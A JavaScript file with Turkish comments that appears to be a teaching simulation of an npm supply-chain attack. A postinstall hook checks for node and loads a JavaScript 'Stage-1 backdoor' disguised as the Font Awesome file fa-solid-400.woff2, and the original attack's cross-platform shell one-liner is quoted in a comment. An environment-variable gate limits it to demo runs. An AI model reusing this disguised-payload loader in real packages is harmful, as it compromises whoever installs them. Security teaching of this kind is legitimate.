"use strict";

/**
 * run-stage1.js
 * -------------
 * package.json -> "postinstall" hook'unun çağırdığı ilk dosya.
 * 
 * RAPORDAKİ KARŞILIĞI:
 *   %WINDIR%\System32\cmd.exe /d /c (command -v node >/dev/null 2>&1 && node ./public/fontawesome/fa-solid-400.woff2)
 *     || (where node >nul 2>&1 && node ./public/fontawesome/fa-solid-400.woff2) || echo ''
 * 
 * Gerçek vakada bu tek satırlık shell komutu üç işletim sistemi ailesini de
 * (macOS/Linux'ta "command -v", Windows'ta "where") destekleyecek şekilde
 * yazılmıştı ve node bulunursa "font dosyası" kılığındaki JS payload'ı
 * çalıştırıyordu.
 * 
 * Bu simülasyonda aynı akışı koruyoruz, ancak güvenlik için DEMO_ACTIVE
 * ortam değişkeni kontrolü ekledik. Bu kontrol, gerçek saldırıda YOKTUR.
 * Sunumda bu farkı vurgulamak önemli.
 */

const path = require("path");
const fs = require("fs");
const os = require("os");
const { execSync } = require("child_process");
const config = require("./config");

// ---------------------------------------------------------------------
// 1. DEMO_ACTIVE KONTROLÜ (SADECE BU SİMÜLASYONDA VAR)
// ---------------------------------------------------------------------
function isDemoExplicitlyEnabled() {
  const enabled = process.env[config.requiredEnvFlag] === "1";
  if (!enabled) {
    console.log(`
╔═══════════════════════════════════════════════════════════════════╗
║  [DEMO] Stage-1 tetiklenmedi.                                   ║
║  Bu simülasyon GÜVENLİK nedeniyle devre dışı bırakıldı.         ║
║  Gerçek saldırıda bu kontrol YOKTUR, doğrudan çalışırdı.        ║
║  Etkinleştirmek için: ${config.requiredEnvFlag}=1 npm install      ║
╚═══════════════════════════════════════════════════════════════════╝
    `);
  }
  return enabled;
}

// ---------------------------------------------------------------------
// 2. SİSTEM KONTROLÜ (Rapordaki "command -v node / where node")
// ---------------------------------------------------------------------
function checkNodeAvailability() {
  try {
    // Windows'ta "where node", Linux/macOS'ta "command -v node"
    const cmd = os.platform() === "win32" ? "where node" : "command -v node";
    execSync(cmd, { stdio: "ignore" });
    return true;
  } catch {
    return false;
  }
}

// ---------------------------------------------------------------------
// 3. STAGE-1 PAYLOAD'INI ÇALIŞTIR
// ---------------------------------------------------------------------
function executeStage1() {
  const stage1Path = path.join(__dirname, "..", "public", "fontawesome", "fa-solid-400.woff2");
  
  // Dosyanın var olduğunu kontrol et
  if (!fs.existsSync(stage1Path)) {
    console.error(`[!] Stage-1 dosyası bulunamadı: ${stage1Path}`);
    return false;
  }

  console.log(`
╔═══════════════════════════════════════════════════════════════════╗
║  [DEMO] Stage-1 backdoor çalıştırılıyor...                      ║
║  Dosya: public/fontawesome/fa-solid-400.woff2                   ║
║  Bu dosya FONT gibi görünüyor, ama aslında JavaScript!          ║
║  Gerçek vakada bu dosya, kurban tarafından FARK EDİLMEDEN       ║
║  node ile çalıştırılırdı.                                       ║
╚═══════════════════════════════════════════════════════════════════╝
  `);

  try {
    // Stage-1 payload'ını çalıştır
    require(stage1Path);
    console.log("[DEMO] ✅ Stage-1 başarıyla çalıştı.");
    return true;
  } catch (error) {
    console.error(`[!] Stage-1 çalıştırılırken hata oluştu:`, error.message);
    return false;
  }
}

// ---------------------------------------------------------------------
// 4. ANA FONKSİYON (Gerçek vakadaki akışı taklit eder)
// ---------------------------------------------------------------------
function main() {
  console.log(`
╔═══════════════════════════════════════════════════════════════════╗
║  [DEMO] postinstall hook'u tetiklendi!                          ║
║  Bu an, gerçek vakadaki "npm install" anına denk gelir.         ║
║  Kurban, projeyi kurduğunu sanıyor ama arka planda...           ║
╚═══════════════════════════════════════════════════════════════════╝
  `);

  // Adım 1: DEMO_ACTIVE kontrolü (SADECE bu simülasyonda var)
  if (!isDemoExplicitlyEnabled()) {
    return; // Burada çıkış yap, backdoor çalışmasın
  }

  // Adım 2: Node.js varlık kontrolü (rapordaki "command -v / where")
  console.log("[DEMO] Node.js varlığı kontrol ediliyor...");
  const nodeAvailable = checkNodeAvailability();
  if (!nodeAvailable) {
    console.log("[DEMO] ⚠️ Node.js bulunamadı. (Gerçek vakada bu durumda sessizce çıkılırdı.)");
    return;
  }
  console.log("[DEMO] ✅ Node.js mevcut.");

  // Adım 3: Stage-1 payload'ını çalıştır
  const success = executeStage1();

  // Adım 4: Sonuç bildirimi
  if (success) {
    console.log(`
╔═══════════════════════════════════════════════════════════════════╗
║  [DEMO] Stage-1 başarıyla çalıştı.                              ║
║  Artık stage2-loader.js devreye girecek ve backdoor            ║
║  tam olarak başlatılacak.                                      ║
║  Saldırgan C2 panelinde kurbanı görmeye başlayacak.            ║
╚═══════════════════════════════════════════════════════════════════╝
    `);
  } else {
    console.log(`
╔═══════════════════════════════════════════════════════════════════╗
║  [DEMO] ❌ Stage-1 çalıştırılamadı.                             ║
║  Lütfen aşağıdakileri kontrol edin:                             ║
║  1. fa-solid-400.woff2 dosyası public/fontawesome/ altında mı?  ║
║  2. Node.js çalışıyor mu?                                       ║
╚═══════════════════════════════════════════════════════════════════╝
    `);
  }
}

// ---------------------------------------------------------------------
// 5. ÇALIŞTIR
// ---------------------------------------------------------------------
main();